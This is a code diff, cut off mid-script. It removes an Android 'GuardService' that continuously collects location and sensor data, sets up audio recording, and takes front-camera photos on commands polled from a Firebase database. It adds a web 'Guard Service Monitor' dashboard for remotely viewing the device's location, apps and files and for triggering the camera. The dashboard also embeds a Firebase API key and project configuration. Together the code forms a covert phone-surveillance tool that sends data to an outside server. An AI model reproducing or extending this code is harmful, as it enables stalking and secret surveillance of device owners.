@@ -1,1052 +1,1192 @@
-package com.sukh.guard;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guard Service Monitor</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        :root {
+            --primary: #6366f1;
+            --primary-dark: #4f46e5;
+            --secondary: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --dark: #1f2937;
+            --light: #f9fafb;
+            --gray: #6b7280;
+            --card-bg: #ffffff;
+            --body-bg: #f3f4f6;
+        }
 
-import android.app.*;
-import android.content.*;
-import android.content.pm.*;
-import android.hardware.*;
-import android.location.*;
-import android.media.*;
-import android.net.*;
-import android.net.wifi.*;
-import android.os.*;
-import android.provider.*;
-import android.telephony.*;
-import android.util.*;
-import java.io.*;
-import java.net.*;
-import java.text.*;
-import java.util.*;
-import org.json.*;
+        .dark-mode {
+            --primary: #818cf8;
+            --primary-dark: #6366f1;
+            --secondary: #34d399;
+            --danger: #f87171;
+            --warning: #fbbf24;
+            --dark: #f9fafb;
+            --light: #1f2937;
+            --gray: #9ca3af;
+            --card-bg: #374151;
+            --body-bg: #111827;
+        }
 
-import android.util.Base64;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            transition: background-color 0.3s, color 0.3s;
+        }
 
-public class GuardService extends Service {
-    private static final String TAG = "GuardService";
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--body-bg);
+            color: var(--dark);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
 
-    private static final String FIREBASE_RES_URL =
-	"https://guard-22007-default-rtdb.firebaseio.com/responses/";
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
 
-    private Handler handler;
-    private Runnable runnable;
-    private LocationManager locationManager;
-    private Location latestLocation = null;
+        /* Header Styles */
+        header {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            padding: 1rem 0;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
 
-    // New features
-    private SensorManager sensorManager;
-    private MediaRecorder mediaRecorder;
-    private boolean isRecording = false;
-    private String audioFilePath;
-    private Handler audioHandler;
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
 
-    // Sensor data
-    private float[] accelerometerData = new float[3];
-    private float[] gyroscopeData = new float[3];
-    private float lightLevel = 0;
-    private float proximityValue = 0;
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
 
-    // Camera command monitoring
-    private Handler cameraCommandHandler;
-    private Runnable cameraCommandChecker;
-    private boolean lastCameraCommandState = false;
-    private static final String FIREBASE_CMD_URL = 
-        "https://guard-22007-default-rtdb.firebaseio.com/commands/front_camera.json";
-    private static final String FIREBASE_IMAGE_URL = 
-        "https://guard-22007-default-rtdb.firebaseio.com/camera_images.json";
+        .logo i {
+            font-size: 1.8rem;
+        }
 
-    // Sensor event listener
-    private final SensorEventListener sensorEventListener = new SensorEventListener() {
-        @Override
-        public void onSensorChanged(SensorEvent event) {
-            switch (event.sensor.getType()) {
-                case Sensor.TYPE_ACCELEROMETER:
-                    accelerometerData = event.values;
-                    break;
-                case Sensor.TYPE_GYROSCOPE:
-                    gyroscopeData = event.values;
-                    break;
-                case Sensor.TYPE_LIGHT:
-                    lightLevel = event.values[0];
-                    break;
-                case Sensor.TYPE_PROXIMITY:
-                    proximityValue = event.values[0];
-                    break;
+        .logo h1 {
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+
+        .controls {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .theme-toggle, .refresh-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .theme-toggle:hover, .refresh-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: rotate(15deg);
+        }
+
+        /* Main Content */
+        .dashboard {
+            padding: 2rem 0;
+        }
+
+        .status-bar {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 2rem;
+            flex-wrap: wrap;
+        }
+
+        .status-card {
+            flex: 1;
+            min-width: 200px;
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 1.5rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .status-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+        }
+
+        .status-icon.online {
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--secondary);
+        }
+
+        .status-icon.offline {
+            background: rgba(239, 68, 68, 0.2);
+            color: var(--danger);
+        }
+
+        .status-icon.warning {
+            background: rgba(245, 158, 11, 0.2);
+            color: var(--warning);
+        }
+
+        .status-info h3 {
+            font-size: 0.9rem;
+            color: var(--gray);
+            margin-bottom: 5px;
+        }
+
+        .status-info p {
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+
+        /* Dashboard Grid */
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 2rem;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 1.5rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+            animation: slideUp 0.5s ease-out;
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+        }
+
+        .dark-mode .card-header {
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .card-header h2 {
+            font-size: 1.2rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .card-header h2 i {
+            color: var(--primary);
+        }
+
+        .card-content {
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        /* Data Lists */
+        .data-list {
+            list-style: none;
+        }
+
+        .data-list li {
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .dark-mode .data-list li {
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .data-list li:last-child {
+            border-bottom: none;
+        }
+
+        .data-key {
+            font-weight: 500;
+        }
+
+        .data-value {
+            color: var(--gray);
+            text-align: right;
+            max-width: 60%;
+            word-break: break-word;
+        }
+
+        /* Map Container */
+        .map-container {
+            height: 300px;
+            background: #e5e7eb;
+            border-radius: 8px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .dark-mode .map-container {
+            background: #4b5563;
+        }
+
+        .map-placeholder {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: var(--gray);
+        }
+
+        .map-placeholder i {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+        }
+
+        /* Charts */
+        .chart-container {
+            position: relative;
+            height: 250px;
+            width: 100%;
+        }
+
+        /* Command Button Styles */
+        .command-btn {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.3s;
+            margin: 10px 0;
+        }
+
+        .command-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        .command-btn:active {
+            transform: translateY(0);
+        }
+
+        .command-btn.active {
+            background: linear-gradient(135deg, var(--secondary), #0da271);
+        }
+
+        .command-btn.disabled {
+            background: var(--gray);
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .command-btn.disabled:hover {
+            transform: none;
+            box-shadow: none;
+        }
+
+        .command-status {
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            margin-top: 10px;
+        }
+
+        .status-true {
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--secondary);
+            border: 1px solid var(--secondary);
+        }
+
+        .status-false {
+            background: rgba(239, 68, 68, 0.2);
+            color: var(--danger);
+            border: 1px solid var(--danger);
+        }
+
+        /* Image Gallery Styles */
+        .image-gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .image-item {
+            position: relative;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            transition: transform 0.3s;
+        }
+
+        .image-item:hover {
+            transform: scale(1.05);
+        }
+
+        .captured-image {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+            display: block;
+        }
+
+        .image-info {
+            padding: 8px;
+            background: var(--card-bg);
+            font-size: 0.8rem;
+        }
+
+        .image-time {
+            color: var(--gray);
+            font-size: 0.7rem;
+        }
+
+        .no-images {
+            text-align: center;
+            padding: 20px;
+            color: var(--gray);
+            font-style: italic;
+        }
+
+        .image-actions {
+            display: flex;
+            gap: 5px;
+            margin-top: 5px;
+        }
+
+        .img-btn {
+            padding: 4px 8px;
+            border: none;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+            flex: 1;
+        }
+
+        .view-btn {
+            background: var(--primary);
+            color: white;
+        }
+
+        .delete-btn {
+            background: var(--danger);
+            color: white;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.8);
+            animation: fadeIn 0.3s;
+        }
+
+        .modal-content {
+            position: relative;
+            margin: 5% auto;
+            width: 90%;
+            max-width: 800px;
+            background: var(--card-bg);
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        .modal-image {
+            width: 100%;
+            max-height: 80vh;
+            object-fit: contain;
+        }
+
+        .modal-info {
+            padding: 15px;
+            border-top: 1px solid rgba(0,0,0,0.1);
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            color: white;
+            background: rgba(0,0,0,0.5);
+            border: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            font-size: 1.2rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideUp {
+            from { 
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
             }
         }
 
-        @Override
-        public void onAccuracyChanged(Sensor sensor, int accuracy) {
-            // Do nothing
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
         }
-    };
 
-    @Override
-    public void onCreate() {
-        super.onCreate();
-
-        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
-
-        startContinuousLocationUpdates();
-        startSensorMonitoring();
-        startStructuredUpdates();
-        setupAudioRecording();
-        startCameraCommandMonitoring(); // Start camera command monitoring
-    }
-
-    private void startContinuousLocationUpdates() {
-        try {
-            LocationListener listener = new LocationListener() {
-                @Override
-                public void onLocationChanged(Location location) {
-                    latestLocation = location;
-                    // Store location history
-                    storeLocationHistory(location);
-                }
-
-                @Override 
-                public void onStatusChanged(String provider, int status, Bundle extras) {}
-
-                public void onProviderEnabled(String provider) {}
-
-                public void onProviderDisabled(String provider) {}
-            };
-
-            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                locationManager.requestLocationUpdates(
-                    LocationManager.GPS_PROVIDER, 2000, 0, listener, Looper.getMainLooper()
-                );
-            }
-
-            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                locationManager.requestLocationUpdates(
-                    LocationManager.NETWORK_PROVIDER, 2000, 0, listener, Looper.getMainLooper()
-                );
-            }
-
-        } catch (SecurityException e) {
-            Log.e(TAG, "Location permission not granted", e);
+        .pulse {
+            animation: pulse 2s infinite;
         }
-    }
 
-    private void startSensorMonitoring() {
-        try {
-            // Accelerometer
-            Sensor accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
-            if (accelerometer != null) {
-                sensorManager.registerListener(sensorEventListener, accelerometer, SensorManager.SENSOR_DELAY_NORMAL);
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .dashboard-grid {
+                grid-template-columns: 1fr;
             }
-
-            // Gyroscope
-            Sensor gyroscope = sensorManager.getDefaultSensor(Sensor.TYPE_GYROSCOPE);
-            if (gyroscope != null) {
-                sensorManager.registerListener(sensorEventListener, gyroscope, SensorManager.SENSOR_DELAY_NORMAL);
+            
+            .status-bar {
+                flex-direction: column;
             }
-
-            // Light sensor
-            Sensor lightSensor = sensorManager.getDefaultSensor(Sensor.TYPE_LIGHT);
-            if (lightSensor != null) {
-                sensorManager.registerListener(sensorEventListener, lightSensor, SensorManager.SENSOR_DELAY_NORMAL);
+            
+            .header-content {
+                flex-direction: column;
+                gap: 15px;
             }
-
-            // Proximity sensor
-            Sensor proximitySensor = sensorManager.getDefaultSensor(Sensor.TYPE_PROXIMITY);
-            if (proximitySensor != null) {
-                sensorManager.registerListener(sensorEventListener, proximitySensor, SensorManager.SENSOR_DELAY_NORMAL);
+            
+            .logo h1 {
+                font-size: 1.3rem;
             }
-
-        } catch (Exception e) {
-            Log.e(TAG, "Sensor monitoring error", e);
+            
+            .image-gallery {
+                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            }
         }
-    }
 
-    // Start camera command monitoring
-    private void startCameraCommandMonitoring() {
-        HandlerThread cameraThread = new HandlerThread("CameraCommandMonitor");
-        cameraThread.start();
-        cameraCommandHandler = new Handler(cameraThread.getLooper());
+        /* Toggle Switch */
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 60px;
+            height: 34px;
+        }
 
-        cameraCommandChecker = new Runnable() {
-            @Override
-            public void run() {
-                checkCameraCommand();
-                cameraCommandHandler.postDelayed(this, 3000); // Check every 3 seconds
-            }
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 34px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 26px;
+            width: 26px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background-color: var(--primary);
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            margin-bottom: 1rem;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+            flex-wrap: wrap;
+        }
+
+        .dark-mode .tabs {
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            border-bottom: 3px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .tab.active {
+            border-bottom: 3px solid var(--primary);
+            color: var(--primary);
+            font-weight: 500;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 10px;
+        }
+
+        .dark-mode ::-webkit-scrollbar-track {
+            background: #374151;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 10px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary-dark);
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <i class="fas fa-shield-alt"></i>
+                    <h1>Guard Service Monitor</h1>
+                </div>
+                <div class="controls">
+                    <button class="refresh-btn" id="refreshBtn">
+                        <i class="fas fa-sync-alt"></i>
+                    </button>
+                    <button class="theme-toggle" id="themeToggle">
+                        <i class="fas fa-moon"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="dashboard">
+        <div class="container">
+            <div class="status-bar">
+                <div class="status-card">
+                    <div class="status-icon online pulse">
+                        <i class="fas fa-signal"></i>
+                    </div>
+                    <div class="status-info">
+                        <h3>Device Status</h3>
+                        <p>Online</p>
+                    </div>
+                </div>
+                <div class="status-card">
+                    <div class="status-icon warning">
+                        <i class="fas fa-battery-half"></i>
+                    </div>
+                    <div class="status-info">
+                        <h3>Battery Level</h3>
+                        <p id="batteryLevel">65%</p>
+                    </div>
+                </div>
+                <div class="status-card">
+                    <div class="status-icon online">
+                        <i class="fas fa-wifi"></i>
+                    </div>
+                    <div class="status-info">
+                        <h3>Network</h3>
+                        <p id="networkType">WiFi</p>
+                    </div>
+                </div>
+                <div class="status-card">
+                    <div class="status-icon online">
+                        <i class="fas fa-map-marker-alt"></i>
+                    </div>
+                    <div class="status-info">
+                        <h3>Location</h3>
+                        <p id="locationStatus">Active</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tabs">
+                <div class="tab active" data-tab="overview">Overview</div>
+                <div class="tab" data-tab="location">Location</div>
+                <div class="tab" data-tab="apps">Apps & Files</div>
+                <div class="tab" data-tab="sensors">Sensors</div>
+                <div class="tab" data-tab="commands">Commands</div>
+                <div class="tab" data-tab="gallery">Camera Gallery</div>
+            </div>
+
+            <div class="tab-content active" id="overview">
+                <div class="dashboard-grid">
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><i class="fas fa-microchip"></i> Device Information</h2>
+                        </div>
+                        <div class="card-content">
+                            <ul class="data-list" id="deviceInfo">
+                                <!-- Device info will be populated here -->
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><i class="fas fa-chart-line"></i> Battery Status</h2>
+                        </div>
+                        <div class="card-content">
+                            <div class="chart-container">
+                                <canvas id="batteryChart"></canvas>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><i class="fas fa-network-wired"></i> Network Information</h2>
+                        </div>
+                        <div class="card-content">
+                            <ul class="data-list" id="networkInfo">
+                                <!-- Network info will be populated here -->
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><i class="fas fa-history"></i> Recent Activity</h2>
+                        </div>
+                        <div class="card-content">
+                            <ul class="data-list" id="recentActivity">
+                                <!-- Recent activity will be populated here -->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tab-content" id="location">
+                <div class="dashboard-grid">
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><i class="fas fa-map-marked-alt"></i> Location Tracking</h2>
+                        </div>
+                        <div class="card-content">
+                            <div class="map-container">
+                                <div class="map-placeholder">
+                                    <i class="fas fa-map"></i>
+                                    <p>Interactive Map Loading...</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><i class="fas fa-info-circle"></i> Location Details</h2>
+                        </div>
+                        <div class="card-content">
+                            <ul class="data-list" id="locationDetails">
+                                <!-- Location details will be populated here -->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tab-content" id="apps">
+                <div class="dashboard-grid">
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><i class="fas fa-mobile-alt"></i> Installed Apps</h2>
+                        </div>
+                        <div class="card-content">
+                            <ul class="data-list" id="installedApps">
+                                <!-- Installed apps will be populated here -->
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><i class="fas fa-folder"></i> File System</h2>
+                        </div>
+                        <div class="card-content">
+                            <ul class="data-list" id="fileSystem">
+                                <!-- File system info will be populated here -->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tab-content" id="sensors">
+                <div class="dashboard-grid">
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><i class="fas fa-compass"></i> Sensor Data</h2>
+                        </div>
+                        <div class="card-content">
+                            <ul class="data-list" id="sensorData">
+                                <!-- Sensor data will be populated here -->
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><i class="fas fa-chart-bar"></i> Sensor Charts</h2>
+                        </div>
+                        <div class="card-content">
+                            <div class="chart-container">
+                                <canvas id="sensorChart"></canvas>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tab-content" id="commands">
+                <div class="dashboard-grid">
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><i class="fas fa-terminal"></i> Device Commands</h2>
+                        </div>
+                        <div class="card-content">
+                            <h3 style="margin-bottom: 15px; color: var(--primary);">Camera Controls</h3>
+                            
+                            <button class="command-btn" id="frontCamBtn">
+                                <i class="fas fa-camera"></i>
+                                Front Camera
+                            </button>
+                            
+                            <div id="frontCamStatus" class="command-status status-false">
+                                Status: Disabled
+                            </div>
+
+                            <!-- Live Image Preview -->
+                            <div id="liveImageContainer" style="display: none; margin-top: 15px;">
+                                <h4 style="color: var(--primary); margin-bottom: 10px;">Latest Capture:</h4>
+                                <div id="latestImagePreview" style="text-align: center;">
+                                    <!-- Latest image will appear here -->
+                                </div>
+                            </div>
+
+                            <div style="margin-top: 20px; padding: 15px; background: rgba(99, 102, 241, 0.1); border-radius: 8px;">
+                                <h4 style="color: var(--primary); margin-bottom: 10px;">Command Instructions:</h4>
+                                <p style="font-size: 0.9rem; color: var(--gray);">
+                                    Click the "Front Camera" button to toggle the camera command. 
+                                    The device will read this command from Firebase and execute accordingly.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><i class="fas fa-history"></i> Command Log</h2>
+                        </div>
+                        <div class="card-content">
+                            <ul class="data-list" id="commandLog">
+                                <li><span class="data-key">System</span><span class="data-value">Command panel initialized</span></li>
+                                <!-- Command logs will appear here -->
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><i class="fas fa-info-circle"></i> Command Status</h2>
+                        </div>
+                        <div class="card-content">
+                            <ul class="data-list" id="commandStatus">
+                                <li><span class="data-key">Front Camera</span><span class="data-value" id="frontCamStatusText">Disabled</span></li>
+                                <li><span class="data-key">Last Update</span><span class="data-value" id="lastCommandUpdate">Never</span></li>
+                                <li><span class="data-key">Firebase Connection</span><span class="data-value" id="firebaseStatus">Disconnected</span></li>
+                                <li><span class="data-key">Images Captured</span><span class="data-value" id="imagesCount">0</span></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tab-content" id="gallery">
+                <div class="dashboard-grid">
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><i class="fas fa-images"></i> Camera Gallery</h2>
+                        </div>
+                        <div class="card-content">
+                            <div id="galleryContainer">
+                                <div class="no-images" id="noImagesMessage">
+                                    <i class="fas fa-camera" style="font-size: 3rem; margin-bottom: 1rem; opacity: 0.5;"></i>
+                                    <p>No images captured yet</p>
+                                    <p style="font-size: 0.8rem; margin-top: 10px;">Enable Front Camera command to capture images</p>
+                                </div>
+                                <div class="image-gallery" id="imageGallery">
+                                    <!-- Images will be dynamically added here -->
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <h2><i class="fas fa-chart-bar"></i> Capture Statistics</h2>
+                        </div>
+                        <div class="card-content">
+                            <ul class="data-list" id="galleryStats">
+                                <li><span class="data-key">Total Images</span><span class="data-value" id="totalImages">0</span></li>
+                                <li><span class="data-key">Last Capture</span><span class="data-value" id="lastCaptureTime">Never</span></li>
+                                <li><span class="data-key">Storage Used</span><span class="data-value" id="storageUsed">0 KB</span></li>
+                                <li><span class="data-key">Average Size</span><span class="data-value" id="averageSize">0 KB</span></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Image Modal -->
+    <div id="imageModal" class="modal">
+        <div class="modal-content">
+            <button class="close-modal" id="closeModal">&times;</button>
+            <img id="modalImage" class="modal-image" src="" alt="Full size image">
+            <div class="modal-info">
+                <h3 id="modalTitle">Image Details</h3>
+                <p id="modalTime"></p>
+                <p id="modalSize"></p>
+                <button class="img-btn view-btn" id="downloadBtn" style="margin-top: 10px;">
+                    <i class="fas fa-download"></i> Download Image
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Firebase configuration - replace with your actual Firebase config
+        const firebaseConfig = {
+            apiKey: "AIzaSyDspdK0lx1FgsvMNwLv4xRXriu64bGpZ9s",
+            authDomain: "https://guard-22007.firebaseapp.com/__/auth/handler",
+            databaseURL: "https://guard-22007-default-rtdb.firebaseio.com",
+            projectId: "guard-22007",
+            storageBucket: "guard-22007.firebasestorage.app",
+            messagingSenderId: "166908422013",
+            appId: "1:166908422013:android:3f6f845b720257c188ce14"
         };
 
-        cameraCommandHandler.post(cameraCommandChecker);
-        Log.d(TAG, "Camera command monitoring started");
-    }
+        // Initialize Firebase
+        let app;
+        let database;
+        let commandsRef;
+        let imagesRef;
+        
+        try {
+            app = firebase.initializeApp(firebaseConfig);
+            database = firebase.database();
+            commandsRef = database.ref('commands');
+            imagesRef = database.ref('camera_images');
+            document.getElementById('firebaseStatus').textContent = 'Connected';
+            document.getElementById('firebaseStatus').style.color = '#10b981';
+        } catch (error) {
+            console.error('Firebase initialization error:', error);
+            document.getElementById('firebaseStatus').textContent = 'Failed to connect';
+            document.getElementById('firebaseStatus').style.color = '#ef4444';
+        }
 
-    // Check camera command from Firebase
-    private void checkCameraCommand() {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    String currentCommand = readFirebaseCommand();
-                    boolean newCommandState = "true".equals(currentCommand);
-                    
-                    Log.d(TAG, "Camera command state: " + newCommandState + ", Last state: " + lastCameraCommandState);
-                    
-                    if (newCommandState && !lastCameraCommandState) {
-                        // Command changed from false to true - take picture
-                        Log.d(TAG, "Camera command activated! Taking front camera picture...");
-                        takeFrontCameraPicture();
+        // DOM Elements
+        const themeToggle = document.getElementById('themeToggle');
+        const refreshBtn = document.getElementById('refreshBtn');
+        const tabs = document.querySelectorAll('.tab');
+        const tabContents = document.querySelectorAll('.tab-content');
+        const frontCamBtn = document.getElementById('frontCamBtn');
+        const frontCamStatus = document.getElementById('frontCamStatus');
+        const frontCamStatusText = document.getElementById('frontCamStatusText');
+        const lastCommandUpdate = document.getElementById('lastCommandUpdate');
+        const commandLog = document.getElementById('commandLog');
+        const imagesCount = document.getElementById('imagesCount');
+        const imageGallery = document.getElementById('imageGallery');
+        const noImagesMessage = document.getElementById('noImagesMessage');
+        const liveImageContainer = document.getElementById('liveImageContainer');
+        const latestImagePreview = document.getElementById('latestImagePreview');
+        
+        // Modal elements
+        const imageModal = document.getElementById('imageModal');
+        const modalImage = document.getElementById('modalImage');
+        const modalTitle = document.getElementById('modalTitle');
+        const modalTime = document.getElementById('modalTime');
+        const modalSize = document.getElementById('modalSize');
+        const closeModal = document.getElementById('closeModal');
+        const downloadBtn = document.getElementById('downloadBtn');
+
+        // Initialize Charts
+        const batteryCtx = document.getElementById('batteryChart').getContext('2d');
+        const batteryChart = new Chart(batteryCtx, {
+            type: 'line',
+            data: {
+                labels: ['10:00', '10:05', '10:10', '10:15', '10:20', '10:25'],
+                datasets: [{
+                    label: 'Battery Level (%)',
+                    data: [85, 80, 75, 70, 68, 65],
+                    borderColor: '#10b981',
+                    backgroundColor: 'rgba(16, 185, 129, 0.1)',
+                    tension: 0.4,
+                    fill: true
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: false,
+                scales: {
+                    y: {
+                        beginAtZero: true,
+                        max: 100
                     }
-                    
-                    lastCameraCommandState = newCommandState;
-                    
-                } catch (Exception e) {
-                    Log.e(TAG, "Error checking camera command: " + e.getMessage());
                 }
             }
-        }).start();
-    }
+        });
 
-    // Read Firebase command
-    private String readFirebaseCommand() {
-        HttpURLConnection conn = null;
-        try {
-            URL url = new URL(FIREBASE_CMD_URL);
-            conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("GET");
-            conn.setConnectTimeout(5000);
-            conn.setReadTimeout(5000);
-            
-            int responseCode = conn.getResponseCode();
-            if (responseCode == HttpURLConnection.HTTP_OK) {
-                InputStream is = conn.getInputStream();
-                Scanner s = new Scanner(is).useDelimiter("\\A");
-                String result = s.hasNext() ? s.next() : "";
+        const sensorCtx = document.getElementById('sensorChart').getContext('2d');
+        const sensorChart = new Chart(sensorCtx, {
+            type: 'bar',
+            data: {
